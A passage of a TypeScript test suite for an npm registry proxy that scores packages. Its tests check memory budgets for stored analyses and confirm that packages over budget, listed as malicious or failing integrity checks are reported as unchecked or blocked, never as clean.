      const big = { ...analysis, padding: "x".repeat(270_000) };

      // and a package kept without a score (KEPT_WITHOUT_SCORE) that apm could only decide it cannot score, long ago
      for (const name of ["oldscored", "@next/swc-oldonly"]) {
        npm.docs.set(name, versions.map((v) => doc(name, v)));

        for (const [i, v] of versions.entries()) npm.times.set(`${name}@${v}`, NOW - (400 - i) * DAY);
      }

      for (const v of versions.slice(0, 60)) {
        await sql("INSERT INTO upstream_analysis (package, version, digest, scorer, analysis, analyzed_at) VALUES ('oldscored', $1, $2, $3, $4::jsonb, 1)", [v, label("oldscored", v), SCORER, JSON.stringify(big)]);
      }

      await sql("INSERT INTO analysis_outcomes (package, version, scorer, outcome, detail, digest, decided_at) VALUES ('@next/swc-oldonly', '0.0.1', $1, 'too-large', 'over the cap', $2, 1)", [SCORER, label("@next/swc-oldonly", "0.0.1")]);
      const [stored] = await sql("SELECT sum(octet_length(analysis::text))::bigint AS bytes FROM upstream_analysis WHERE package = 'oldscored'");
      const proxy = await measured(url);

      try {
        for (const name of ["oldscored", "@next/swc-oldonly"]) {
          const before = proxy.total();
          const r = await routed(proxy.url, npm.url, `/-/apm/v1/packages/${encodeURIComponent(name)}`);

          expect(r.status).toBe(200);
          // no row yet: the page reads npm's packument, and admission asks only whether the older versions have one
          expect(proxy.total() - before).toBeLessThan(50_000);
        }
      } finally {
        proxy.close();
      }

      const kept = z.array(z.object({ package: z.string(), versions: z.coerce.number() })).parse(await sql("SELECT package, jsonb_array_length(summary -> 'versions') AS versions FROM kept_packages ORDER BY package"));

      expect(z.object({ bytes: z.coerce.number() }).parse(stored).bytes).toBeGreaterThan(16_000_000);
      // 0.0.1 to 0.0.60 are not among the versions kept: the newest KEPT_VERSIONS by publish time and by number
      expect(kept).toEqual([
        { package: "@next/swc-oldonly", versions: KEPT_VERSIONS },
        { package: "oldscored", versions: KEPT_VERSIONS },
      ]);
    }));
});

// Post-launch review of 216a4c7, findings 6 and 7: between reading a package and keeping it, a resolve held its
// dist-tags uncharged, and the analyses it read for the versions it picked were held, parsed and kept with the tree
// charged to nothing. Both are charged now, and an analysis that did not fit the request reads as not checked
// (over-budget), never as a version with no score, nor as a clean one.
describe("what a resolve reads of the analyses is charged to it, and what does not fit is never clean", () => {
  const noDigest = (): never => {
    throw new Error("no digest");
  };

  const label = (name: string, version: string): string => digestLabel(digestOf({ integrity: integrityOf(`${name}@${version}`), shasum: "1".repeat(40) }) ?? noDigest());

  /** The store with every read of analyses that names a package but `root` changed by `read`. */
  const atWalk = (root: string, read: (s: StoreApi, input: Parameters<StoreApi["upstreamAnalysesWithin"]>[0]) => ReturnType<StoreApi["upstreamAnalysesWithin"]>) => (s: StoreApi): StoreApi => ({
    ...s,
    upstreamAnalysesWithin: (input) => (input.keys.some((k) => k.package !== root) ? read(s, input) : s.upstreamAnalysesWithin(input)),
  });

  const scoreTree = async (sql: (q: string, p?: unknown[]) => Promise<unknown[]>) => {
    for (const [n, v] of [["app", "1.0.0"], ["dep", "1.0.0"], ["risky", "1.0.0"]] as const) await scored(sql, n, v);
  };

  test("a read of the walk's analyses that fails fails the resolve: it is never answered", () =>
    withRig(async ({ url, npm, sql }) => {
      await scoreTree(sql);
      expect((await resolve({ url, npm: npm.url, name: "app" })).status).toBe(200);
      const dropped = atWalk("app", () => Effect.fail(new StoreError({ operation: "upstreamAnalysesFor", cause: new Error("Connection terminated unexpectedly") })));

      // the worker answers a StoreError 503 or 500 (worker.ts), so the CLI installs nothing
      for (const strict of [false, true]) await expect(resolve({ url, npm: npm.url, name: "app", strict, store: dropped })).rejects.toBeInstanceOf(StoreError);
    }));

  test("a dependency whose analysis does not fit the request is not checked (over-budget), never unscored or clean", () =>
    withRig(async ({ url, npm, sql }) => {
      await scoreTree(sql);
      const starved = atWalk("app", (s, input) => s.upstreamAnalysesWithin({ ...input, allowance: 0 }));
      const full = await resolve({ url, npm: npm.url, name: "app" });
      const r = await resolve({ url, npm: npm.url, name: "app", store: starved });

      expect(full.body.tree?.packages.map((p) => p.name)).toEqual(["dep", "risky"]);
      expect(r.status).toBe(200);
      // still listed: what needs no score of them is checked (review of 6f206c5, finding 1)
      expect(r.body.tree?.packages).toEqual(full.body.tree?.packages);
      expect(r.body.warnings?.filter((w) => w.kind === "unchecked").map((w) => w.name)).toEqual(["dep", "risky"]);
      expect(r.text).toContain(OVER_BUDGET_TEXT);
      // on 216a4c7 a version whose analysis was not read had score null: queued for analysis, "not scored yet"
      expect(r.body.warnings?.some((w) => w.kind === "pending" || w.kind === "unscorable")).toBe(false);
      expect(r.text).not.toContain("queued for analysis");
      expect((await resolve({ url, npm: npm.url, name: "app", strict: true, store: starved })).status).not.toBe(200);
    }));

  test("a dependency's dist-tags are charged to the request while its analyses are read", () =>
    withRig(async ({ url, npm, sql }) => {
      await scoreTree(sql);
      const count = 50_000;

      npm.tags.set("dep", Object.fromEntries(Array.from({ length: count }, (_, i) => [`t${i}`, "1.0.0"])));
      const lease = new MemoryPool().request();
      const taken: number[] = [];
      const watched = atWalk("app", (s, input) => Effect.suspend(() => (taken.push(lease.taken), s.upstreamAnalysesWithin(input))));

      try {
        const r = await resolve({ url, npm: npm.url, name: "app", store: watched, lease });

        expect(r.status).toBe(200);
        expect(r.body.tree?.packages.map((p) => p.name)).toEqual(["dep", "risky"]);
        // each tag `"t12345":"1.0.0"` is a key and a value of about 16 characters: at least 100 of weight. On 216a4c7 the
        // request held 13 kB here, the tags' 7 MB counted by nobody
        process.stdout.write(`[analysis-budget] ${count} dist-tags on a dependency: the request held ${((taken[0] ?? 0) / 1024 / 1024).toFixed(2)} MiB as its analyses were read\n`);
        expect(taken.length).toBe(1);
        expect(taken[0]).toBeGreaterThan(count * 100);
      } finally {
        lease.release();
      }
    }));

  /** A next-like analysis of `name@version`: 2,656 files left unread (skipped), and `kept` characters of evidence kept. */
  async function heavy(sql: (q: string, p?: unknown[]) => Promise<unknown[]>, name: string, version: string, kept: number): Promise<void> {
    const m = doc(name, version);
    const file = (path: string, text: string) => ({ path, size: text.length, mode: 0o644, data: encoder.encode(text) });
    const analysis = analyze({ name, manifest: m, files: [file("package.json", JSON.stringify(m)), file("index.js", "module.exports = 1;\n")], publisher: "u", previousPublishers: [] });
    const skipped = Array.from({ length: 2656 }, (_, i) => ({ path: `dist/compiled/chunk-${i}/index.js`, size: 120_000, reason: "over-budget" }));

    await sql("INSERT INTO upstream_analysis (package, version, digest, scorer, analysis, analyzed_at) VALUES ($1, $2, $3, $4, $5::jsonb, 0)", [name, version, label(name, version), SCORER, JSON.stringify({ ...analysis, skipped, padding: "x".repeat(kept) })]);
  }

  test("a tree of next-like dependencies: the walk reads their analyses trimmed, and keeps them charged", () =>
    withRig(async ({ url, npm, sql }) => {
      const deps = Array.from({ length: 20 }, (_, i) => `heavy-dep-${i}`);

      npm.docs.set("heavy", [doc("heavy", "1.0.0", Object.fromEntries(deps.map((d) => [d, "^1.0.0"])))]);
      await scored(sql, "heavy", "1.0.0");

      for (const d of deps) {
        npm.docs.set(d, [doc(d, "1.0.0")]);
        await heavy(sql, d, "1.0.0", 30_000);
      }

      const [stored] = await sql("SELECT sum(octet_length(analysis::text))::bigint AS bytes FROM upstream_analysis WHERE package LIKE 'heavy-dep-%'");
      const history = z.object({ bytes: z.coerce.number() }).parse(stored).bytes;
      const proxy = await measured(url);
      const lease = new MemoryPool().request();
      const layers = Layer.provideMerge(Upstream.layer(npm.url, 60_000, null), Layer.mergeAll(Store.postgres(url), Clock.fixed({ now: NOW, wallNow: NOW }), noBlobs, Layer.succeed(RegistryConfig, settings(npm.url))));
      const walk = new MemoryPool().request();

      try {
        const before = proxy.total();
        const r = await resolve({ url: proxy.url, npm: npm.url, name: "heavy", lease });
        const bytes = proxy.total() - before;

        // the walk's own read of the twenty, as a level of it reads them: what stays taken is what its answer holds
        const got = await Effect.runPromise(
          Effect.flatMap(Upstream, (up) =>
            up.chosen({ names: deps, lease: walk, choices: () => [{ key: "latest", choose: (pkg) => pkg.versions }], keep: (c, reserve) => keptSummary({ kind: "upstream", name: c.name, distTags: c.distTags, versions: [...(c.versions.get("latest") ?? [])] }, reserve), analyses: "trimmed" }),
          ).pipe(Effect.provide(layers), Effect.scoped),
        );

        process.stdout.write(`[analysis-budget] 20 next-like dependencies (${(history / 1e6).toFixed(1)} MB stored): a resolve read ${(bytes / 1e6).toFixed(2)} MB of the database, the request held ${(lease.peakTaken / 1024 / 1024).toFixed(2)} MiB at most; the level's answer holds ${(walk.taken / 1024 / 1024).toFixed(2)} MiB\n`);
        expect(r.status).toBe(200);
        expect(r.body.tree?.packages.map((p) => p.name).sort()).toEqual([...deps].sort());
        // whole, each is about 300 kB, nine tenths of it the files left unread, which no dependency's check reads
        expect(history).toBeGreaterThan(20 * 250_000);
        expect(bytes).toBeLessThan(20 * 60_000);
        expect([...got.values()].map((a) => a.kind)).toEqual(deps.map(() => "found"));
        // the 30 kB each keeps, parsed (two bytes a character), stays charged while the answer holds it
        expect(walk.taken).toBeGreaterThan(20 * 2 * 30_000);
      } finally {
        walk.release();
        lease.release();
        proxy.close();
      }
    }));
});

// Review of 6f206c5. Finding 1: an analysis that did not fit took with it what needs no score: the walk let go of the
// version it picked, so the OSSF feed never saw it, and the scanner returned before comparing the lockfile's integrity.
// Finding 6: a version's document and the credentialed abbreviated packument read every version's analysis, so an
// unrelated one that did not fit made them a 503. Finding 7: a root analysis that landed during the resolve and did not
// fit its reread answered 404, "No package named".
describe("what needs no score is checked of a version whose analysis does not fit, and only what is shown is read", () => {
  const noDigest = (): never => {
    throw new Error("no digest");
  };

  const label = (name: string, version: string): string => digestLabel(digestOf({ integrity: integrityOf(`${name}@${version}`), shasum: "1".repeat(40) }) ?? noDigest());

  /** The store with every read of analyses under `allowance` at most, or only those naming a package but `root`. */
  const capped = (allowance: number, root?: string) => (s: StoreApi): StoreApi => ({
    ...s,
    upstreamAnalysesWithin: (input) => (root === undefined || input.keys.some((k) => k.package !== root) ? s.upstreamAnalysesWithin({ ...input, allowance: Math.min(allowance, input.allowance) }) : s.upstreamAnalysesWithin(input)),
  });

  const ScanBody = z
    .object({
      advisories: z.array(z.object({ package: z.string(), level: z.string() })),
      blocked: z.array(z.object({ package: z.string(), kind: z.string() })),
      unchecked: z.array(z.object({ package: z.string(), reason: z.string() })),
      pending: z.array(z.object({ package: z.string() })),
    })
    .loose();

  async function scan(input: { url: string; npm: string; packages: { name: string; version: string; integrity?: string }[]; store?: (s: StoreApi) => StoreApi }) {
    const req = new Request("http://registry.test/-/apm/v1/scan", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ packages: input.packages }) });
    const program = Effect.flatMap(scanResponse(req, { kind: "user", user: "someone", tokenHash: "0".repeat(64), scope: "publish" }), (res) => Effect.promise(async () => ScanBody.parse(await res.json())));

    return Effect.runPromise(program.pipe(Effect.provide(rigLayers(input)), Effect.scoped));
  }

  test("a dependency the OSSF feed lists is refused in every mode, whether its analysis fit or not", () =>
    withRig(async ({ url, npm, sql }) => {
      for (const [n, v] of [["app", "1.0.0"], ["dep", "1.0.0"], ["risky", "1.0.0"]] as const) await scored(sql, n, v);

      for (const store of [undefined, capped(0, "app")]) {
        for (const strict of [false, true]) {
          const r = await resolve({ url, npm: npm.url, name: "app", strict, store, listed: ["risky@1.0.0"] });

          // on 6f206c5 an analysis that did not fit let risky@1.0.0 install, with a warning that it was not checked
          expect(r.status).toBe(422);
          expect(r.text).toContain("MAL-TEST");
        }
      }
    }));

  test("a scanned version whose analysis does not fit still has its integrity compared, and is unchecked, never clean", () =>
    withRig(async ({ url, npm, sql }) => {
      await scored(sql, "dep", "1.0.0");
      const other = await scan({ url, npm: npm.url, packages: [{ name: "dep", version: "1.0.0", integrity: integrityOf("other bytes") }], store: capped(0) });

      // on 6f206c5: unchecked, with no fatal advisory, so a lockfile naming other bytes installed in the default mode
      expect(other.blocked).toEqual([{ package: "dep", kind: "integrity" }]);
      expect(other.advisories.map((a) => a.level)).toEqual(["fatal"]);
      const same = await scan({ url, npm: npm.url, packages: [{ name: "dep", version: "1.0.0", integrity: integrityOf("dep@1.0.0") }], store: capped(0) });

      expect(same.blocked).toEqual([]);
      expect(same.pending).toEqual([]);
      expect(same.unchecked).toEqual([{ package: "dep", reason: OVER_BUDGET_TEXT }]);
      // and with room for it, scored: nothing unchecked
      expect((await scan({ url, npm: npm.url, packages: [{ name: "dep", version: "1.0.0", integrity: integrityOf("dep@1.0.0") }] })).unchecked).toEqual([]);
    }));

  test("a version's document and the credentialed install packument read no analysis of another version", () =>
    withRig(async ({ url, npm, sql }) => {
      npm.docs.set("twoscores", [doc("twoscores", "1.0.0"), doc("twoscores", "1.0.1")]);
      await scored(sql, "twoscores", "1.0.1");
      // 1.0.0's analysis is far past what the requests below may hold, 1.0.1's well inside it
      await sql("INSERT INTO upstream_analysis (package, version, digest, scorer, analysis, analyzed_at) SELECT 'twoscores', '1.0.0', $1, scorer, analysis || jsonb_build_object('padding', repeat('x', 300000)), 0 FROM upstream_analysis WHERE package = 'twoscores'", [label("twoscores", "1.0.0")]);

      const served = async (path: string, viaSafe: boolean, headers?: Record<string, string>) => {
        const req = new Request(`http://registry.test${path}`, { headers });
        const program = Effect.flatMap(upstreamRoute(req, new URL(req.url), viaSafe), (res) => Effect.promise(async () => ({ status: res?.status ?? 0, text: (await res?.text()) ?? "" })));

        return Effect.runPromise(program.pipe(Effect.provide(rigLayers({ url, npm: npm.url, store: capped(100_000) })), Effect.scoped));
      };

      for (const viaSafe of [false, true]) {
        const r = await served("/twoscores/1.0.1", viaSafe);

        // on 6f206c5: 503, both versions' analyses read
        expect(r.status).toBe(200);
        expect(r.text).toContain('"_apmScore"');
      }

      expect((await served("/twoscores", false, { authorization: "Bearer x", accept: "application/vnd.npm.install-v1+json" })).status).toBe(200);
      // the full packument embeds every version's score: one that does not fit is a 503, never left out
      expect((await served("/twoscores", false)).status).toBe(503);
    }));

  test("a root analysis that lands during the resolve and does not fit its reread is a 503 naming the budget, not a 404", () =>
    withRig(async ({ url, npm, sql }) => {
      npm.docs.set("late", [doc("late", "1.0.0")]);
      let reads = 0;

      // the first read finds no analysis of late@1.0.0, so the resolve waits for it; by the reread it has landed, too large
      const landing = (s: StoreApi): StoreApi => ({
        ...s,
        upstreamAnalysesWithin: (input) =>
          ++reads === 1 ? s.upstreamAnalysesWithin(input) : Effect.flatMap(Effect.promise(() => (reads === 2 ? scored(sql, "late", "1.0.0") : Promise.resolve())), () => s.upstreamAnalysesWithin({ ...input, allowance: 0 })),
      });

      const r = await resolve({ url, npm: npm.url, name: "late", store: landing });

      expect(reads).toBeGreaterThanOrEqual(2);
      // on 6f206c5: 404, "No package named late"
      expect(r.status).toBe(503);
      expect(r.text).toContain(OVER_BUDGET_TEXT);
      expect(r.text).not.toContain("No package named");
    }));
});
